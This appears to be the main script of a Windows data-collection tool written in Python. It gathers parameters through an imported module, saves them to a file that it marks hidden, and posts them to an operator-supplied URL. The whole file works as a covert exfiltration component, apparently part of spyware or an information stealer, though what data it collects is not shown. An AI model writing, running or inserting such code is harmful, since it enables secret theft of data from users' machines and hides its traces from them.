from optparse import OptionParser

import requests
import win32api
import win32con

import operations
from config import MY_FILE


def main():
    # parser options to choose the output name
    parser = OptionParser()
    parser.add_option('-u', '--url',
                      help='the full requested url to post the collected data')
    (options, args) = parser.parse_args()
    if options.url is None:
        raise Exception('There is no --url arg, try again.')
    relevant_data = operations.get_params()
    open_hidden_file(relevant_data)
    requests.post(options.url, data=relevant_data)


def open_hidden_file(relevant_data: dict):
    with open(MY_FILE, 'w') as my_file:
        my_file.write(f'{relevant_data}')
    win32api.SetFileAttributes(MY_FILE, win32con.FILE_ATTRIBUTE_HIDDEN)


if __name__ == '__main__':
    main()
